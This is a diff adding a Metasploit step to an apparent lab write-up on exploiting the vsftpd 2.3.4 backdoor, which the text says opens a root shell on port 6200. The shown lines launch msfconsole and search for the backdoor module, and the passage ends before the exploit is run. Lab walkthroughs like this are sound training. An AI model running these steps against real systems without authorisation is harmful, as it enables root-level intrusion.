@@ -191,3 +191,37 @@ From the nmap output I confirmed:
 ```
 
 vsftpd 2.3.4 has a backdoor that was added directly into the source code in 2011. When triggered, it opens a root shell on port 6200. Metasploit has a ready made module for this.
+
+## Step 4 — Exploiting vsftpd 2.3.4 with Metasploit
+
+### Started Metasploit
+
+```bash
+msfconsole -q
+```
+<p align="center">
+  <img src="images/step3-1.png" width="600">
+</p>
+
+### Searched for the vsftpd Exploit
+
+```bash
+msf > search vsftpd
+``` 
+```
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
+   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor
+```
+<p align="center">
+  <img src="images/step4-1.png" width="600">
+</p>
+
+### Selected the Exploit
